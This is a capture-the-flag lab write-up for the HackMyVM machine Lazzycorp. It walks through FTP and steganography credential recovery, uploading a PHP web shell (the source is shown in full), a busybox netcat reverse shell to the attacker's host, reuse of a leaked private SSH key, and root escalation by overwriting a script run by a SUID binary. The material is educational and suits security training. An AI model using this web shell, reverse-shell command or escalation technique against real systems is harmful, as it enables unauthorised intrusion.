## HackMyVM - Lazzycorp
Finding the IP address of the target host. I used `10.9.9.0/24` because this is the subnet for all the security VMs
```bash
kali :: exercises/HMV/lazzycorp » fping -agq 10.9.9.0/24

---response---
10.9.9.1
10.9.9.12
```

### Information Collection
Using `nmap` to check for all the open ports.
```bash
kali :: exercises/HMV/lazzycorp » nmap -p- 10.9.9.12                                                                       1 ↵
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 12:02 EDT
Nmap scan report for 10.9.9.12
Host is up (0.0015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
we see `FTP`, `SSH`, and `http` ports open. Service and version enumeration using `nmap` results to the following
```bash
kali :: exercises/HMV/lazzycorp » nmap -sSVC -p21,22,80 10.9.9.12 -oA ./nmap/lazzycorp 

---response---
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 12:26 EDT
Nmap scan report for 10.9.9.12
Host is up (0.0017s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.6.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 46:82:43:4b:ef:e0:b0:50:04:c0:d5:2c:3c:5c:7d:4a (RSA)
|   256 52:79:ea:92:35:b4:f2:5d:b9:14:f0:21:1c:eb:2f:66 (ECDSA)
|_  256 98:fa:95:86:04:75:31:39:c6:60:26:9e:26:86:82:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/cms-admin.php /auth-LazyCorp-dev/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: LazyCorp | Empowering Devs
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
The `-oA` is used to save the output in all supported `nmap` formats. Parsing the `nmap` output we can see that anonymous login to the `FTP` service is allowed. Also there's a `robots.txt` file in the web server.
#### 1. Anonymous FTP Login
We can try to access the FTP service as the anonymous user using the following commands.
```bash
kali :: exercises/HMV/lazzycorp » ftp 10.9.9.12
Connected to 10.9.9.12.
220 (vsFTPd 3.0.5)
Name (10.9.9.12:cyxteen): anonymous
331 Please specify the password.
Password:
230 Login successful.
```
Success we now have access to the FTP service and all it can offer. Checking for all the files in the file server we only have one folder (pub) where it contains one file (note.jpg). and we can save it to out attacker's machine.
```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||60820|)
150 Here comes the directory listing.
dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 .
dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 ..
drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||10442|)
150 Here comes the directory listing.
drwxr-xr-x    2 114      119          4096 Jul 16 12:35 .
dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 ..
-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg
226 Directory send OK.
ftp> get note.jpg
local: note.jpg remote: note.jpg
229 Entering Extended Passive Mode (|||19362|)
150 Opening BINARY mode data connection for note.jpg (1366786 bytes).
100% |**********************************************************************************|  1334 KiB   36.45 MiB/s    00:00 ETA
226 Transfer complete.
1366786 bytes received in 00:00 (34.71 MiB/s)
```
we have finally saved the file to our machine and we try to determine which kind of file we are dealing with.
```bash
kali :: exercises/HMV/lazzycorp » file note.jpg
note.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2296x4080, components 3
```
This command verifies that the image file is indeed an image file and not another type of file disguised as an image file
try checking for human readable text within the image file using `strings` command.
```bash
kali :: exercises/HMV/lazzycorp » strings note.jpg | head
JFIF

$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
        #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
6G$M
>c33
_-q!
```
Running this command and observing the output nothing really stood out in the output. trying to uncover any unconventional hidden data using `exifool` still nothing was found.
```bash
kali :: exercises/HMV/lazzycorp » exiftool note.jpg
ExifTool Version Number         : 13.25
File Name                       : note.jpg
Directory                       : .
File Size                       : 1367 kB
File Modification Date/Time     : 2025:07:16 08:35:22-04:00
File Access Date/Time           : 2025:08:20 12:36:51-04:00
File Inode Change Date/Time     : 2025:08:20 12:36:51-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 2296
Image Height                    : 4080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2296x4080
Megapixels                      : 9.4
```
At this time I though that I had tried every possible way to extract the secrets of the `note.jpg` file. Using the `eog` command to view the contents of the image file results to the following `The password of you username dev is shared 😊`.  the message was cryptic and made no sense. but as a last resort I tried running `stegseek` command on the image file
```bash
kali :: exercises/HMV/lazzycorp » stegseek note.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "creds.txt".
[i] Extracting to "note.jpg.out".

kali :: exercises/HMV/lazzycorp » la
total 4.0G
-rw-r--r-- 1 cyxteen cyxteen 2.1G Jul 21 02:58 lazzycorp.ova
-rw-rw-r-- 1 cyxteen cyxteen 2.0G Aug 20 08:03 lazzycorp.zip
drwxrwxr-x 2 cyxteen cyxteen 4.0K Aug 20 12:26 nmap
-rw-rw-r-- 1 cyxteen cyxteen 1.4M Jul 16 08:35 note.jpg
-rw-rw-r-- 1 cyxteen cyxteen   43 Aug 20 13:18 note.jpg.out
-rw-rw-r-- 1 cyxteen cyxteen   12 Aug 20 12:58 users
kali :: exercises/HMV/lazzycorp » cat note.jpg.out
Username: dev
Password: d3v3l0pm3nt!nt3rn
```
We now have the password and the username that it's associated with.
Visiting the web server we are provided with tips on how to get the password for the user dev and also we stumble upon another username `arvind`.
The `robots.txt` file exposes two paths. It's worth noting that web servers paths on Linux systems are case-sensitive.
Running `nikto` to scan the website for vulnerabilities
```bash
kali :: exercises/HMV/lazzycorp » nikto -h http://10.9.9.12
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.9.9.12
+ Target Hostname:    10.9.9.12
+ Target Port:        80
+ Start Time:         2025-08-20 13:26:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 246, size: 639791cc4ffb8, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
+ 8076 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-08-20 13:26:54 (GMT-4) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
The command has not uncovered anything serious or at least anything that we did not previously had an idea about.
Running the `feroxbuster` command on the paths that were exposed in the `robots.txt` file we finally get this output
```bash
kali :: exercises/HMV/lazzycorp » feroxbuster -u http://10.9.9.12/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,zip,jpg,jpeg,png

<SNIP>
404      GET        9l       31w      271c http://10.9.9.12/auth-lazycorp-dev/auth-LazyCorp-dev
404      GET        9l       31w      271c http://10.9.9.12/auth-lazycorp-dev/cms-admin.php
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       21l       53w      710c http://10.9.9.12/auth-lazycorp-dev/login.php
301      GET        9l       28w      326c http://10.9.9.12/auth-lazycorp-dev/uploads => http://10.9.9.12/auth-lazycorp-dev/uploads/
302      GET        0l        0w        0c http://10.9.9.12/auth-lazycorp-dev/dashboard.php => login.php
```
When we visit the `login.php` file we are greeted with a login page. Using the credentials obtained from the jpg file we can login as the user dev and explore the different features in the website.
After a successful login t the page, there's a file upload option. and since we did stumble upon an `uploads` directory we can can access the uploaded reverse shell from there.
```rev.php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
we can access the reverse shell in this URL `http://10.9.9.12/auth-lazycorp-dev/uploads/rev_shell.php?cmd=` and enter the command you want to execute on the target machine. This file gives you access to a remote control access. and in this case I decided to run a reverse shell command to call back to my kali machine `busybox nc 10.6.6.5 9001 -e sh`
```bash
kali :: ~ » nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.6.6.5] from (UNKNOWN) [10.9.9.12] 33850
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we get foothold access to the machine. Going through the web server is insecure in many ways such as hard coding credentials and no input validation
```php
<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if ($_POST['username'] === 'dev' && $_POST['password'] === 'd3v3l0pm3nt!nt3rn') {
        $_SESSION['loggedin'] = true;
        header("Location: dashboard.php");
        exit;
    } else {
        $error = "Invalid credentials.";
    }
}
?>
```
and this was how the webserver handled the file uploaded
```php
<?php
  if (isset($_FILES['upload'])) {
      $target = "uploads/" . basename($_FILES['upload']['name']);
      if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
          echo "<div class='alert alert-success mt-3'>Upload successful!</div>";
      } else {
          echo "<div class='alert alert-danger mt-3'>Upload failed!</div>";
      }
  }
  ?>
```
root flag is located in `arvind` directory
```bash
FLAG{you_got_foothold_nice}
```

#### Privilege Escalation
Moving from `www-data` user to `arvind` upon visiting the `.ssh` file we learn that there are both ssh keys in the file and the permissions are set in a way that any logged in user can access them
```bash
ls -la
total 20
drwxr-xr-x    2 arvind   arvind        4096 Jul  9 07:37 .
drwxr-xr-x    5 arvind   arvind        4096 Jul 16 12:49 ..
-rw-------    1 arvind   arvind         747 Jul  9 07:47 authorized_keys
-rw-r--r--    1 arvind   arvind        3389 Jul  9 07:37 id_rsa
-rw-r--r--    1 arvind   arvind         747 Jul  9 07:37 id_rsa.pub
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
We then copy the private key to our attacker's machine and ssh into the target host using ssh for a more stable shell and another user.
```bash
kali :: exercises/HMV/lazzycorp » vim id_rsa
kali :: exercises/HMV/lazzycorp » chmod 600 id_rsa
```
For the next step to work, don't forget to set the right permission. which is (600) on the private key file, which translates to `read+write` in linux terms
```bash
kali :: exercises/HMV/lazzycorp » ssh arvind@10.9.9.12 -i id_rsa                                             130 ↵
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 21 Aug 2025 04:33:01 AM UTC

  System load:  0.0               Processes:               137
  Usage of /:   56.9% of 8.02GB   Users logged in:         0
  Memory usage: 25%               IPv4 address for enp0s3: 10.9.9.12
  Swap usage:   0%

 * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support on 31 Ma

   For more details see:
   https://ubuntu.com/20-04

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

31 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Welcome to LazyCorp. No flags here, go back.
Last login: Wed Jul 16 12:24:12 2025
arvind@arvindlazycorp:~$ whoami
arvind
arvind@arvindlazycorp:~$ id
uid=1000(arvind) gid=1000(arvind) groups=1000(arvind),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)
```
#### From arvind-> root
Upon login with the arvind user, we then find the `reset` file which resets the webservers and it has the SUID permissions
```bash
arvind@arvindlazycorp:~$ ls -la
total 60
drwxr-xr-x 5 arvind arvind  4096 Jul 16 12:49 .
drwxr-xr-x 3 root   root    4096 Jul  5 14:44 ..
-rw------- 1 arvind arvind    16 Jul 16 12:50 .bash_history
-rw-r--r-- 1 arvind arvind   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 arvind arvind  3771 Feb 25  2020 .bashrc
drwx------ 2 arvind arvind  4096 Jul  5 14:45 .cache
drwxrwxr-x 3 arvind arvind  4096 Jul  7 08:50 .local
-rw-r--r-- 1 arvind arvind   807 Feb 25  2020 .profile
-rwsr-xr-x 1 root   root   16744 Jul 16 12:22 reset
drwxr-xr-x 2 arvind arvind  4096 Jul  9 07:37 .ssh
-rw-r--r-- 1 arvind arvind     0 Jul  5 14:45 .sudo_as_admin_successful
-rw-r--r-- 1 arvind arvind    28 Jul 16 10:26 user.txt
```
Trying to find out how the `reset` file works, I ran the `strings` command on it and found this interesting line
```bash
arvind@arvindlazycorp:~$ strings reset
<SNIP>
/usr/bin/reset_site.sh
<SNIP>
```
this means when we execute the file `reset` it runs this command under the hood. Trying to learn more about the file, we see that `arvind` user has full access to it.
```bash
arvind@arvindlazycorp:~$ ls -la /usr/bin/reset_site.sh
-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh
```
and the following are the contents of the file
```bash
arvind@arvindlazycorp:~$ cat /usr/bin/reset_site.sh
#!/bin/bash

echo "[*] Resetting website from backup..."

# Remove current site
rm -rf /var/www/html/*
# Restore from backup
cp -r /opt/backup/* /var/www/html/
# Set correct ownership
chown -R www-data:www-data /var/www/html/

echo "[+] Done resetting."
```
It's a simple file that works by removing the current site directory and copies a backup of the file to the same directory.
```bash
arvind@arvindlazycorp:~$ echo 'chmod +s /bin/bash' > /usr/bin/reset_site.sh
arvind@arvindlazycorp:~$ ./reset
arvind@arvindlazycorp:~$ bash -p
bash-5.0# id
uid=1000(arvind) gid=1000(arvind) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd),1000(arvind)
```
The above commands copies a privilege escalation command into the script and when you execute the `reset` program, it also runs the other command that was appended in the file. In this case we set the `SUID` bit to the `/bin/bash` program and then run `bash -p` 
root flag
```bash
bash-5.0# cd /root
bash-5.0# cat root.txt
FLAG{lazycorp_reset_exploit_worked}
```

### Lesson Learnt
Web server paths on Linux systems are case-sensitive.